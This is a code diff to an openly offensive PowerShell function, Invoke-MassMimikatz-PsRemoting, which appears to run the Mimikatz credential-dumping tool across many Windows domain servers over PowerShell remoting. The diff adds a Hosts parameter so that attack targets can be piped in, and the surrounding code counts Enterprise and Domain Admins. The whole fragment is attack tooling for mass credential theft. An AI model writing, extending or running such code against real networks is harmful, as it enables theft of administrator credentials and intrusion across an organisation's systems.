@@ -29,6 +29,10 @@ function Invoke-MassMimikatz-PsRemoting
         HelpMessage="This limits how many servers to run mimikatz on.")]
         [int]$MaxHosts = 5,
 
+        [Parameter(Position=0,ValueFromPipeline=$true)]
+        [String[]]
+        $Hosts,
+
         [Parameter(Mandatory=$false,
         HelpMessage="Limit results by the provided operating system. Default is all.")]
         [string]$OsFilter = "*",
@@ -151,16 +155,23 @@ function Invoke-MassMimikatz-PsRemoting
 
         Write-Verbose "Found $EaCount Enterprise Admins"
         Write-Verbose "Found $DaCount Domain Admins"
+        
 
         # ----------------------------------------
-        # Get the list of domain computers
+        # Get system targets
         # ----------------------------------------
-
-        Write-verbose "Getting list of Servers from $DomainController..."
 
         # Create data table to house results
         $TblServers = New-Object System.Data.DataTable 
         $TblServers.Columns.Add("ComputerName") | Out-Null
+
+        $hosts | %{ $TblServers.Rows.Add($_) | Out-Null }
+
+        # ----------------------------------------
+        # Get the list of domain computers
+        # ----------------------------------------
+        Write-verbose "Getting list of Servers from $DomainController..."
+
 
         # Get domain computers from dc 
         if ($OsFilter -eq "*"){
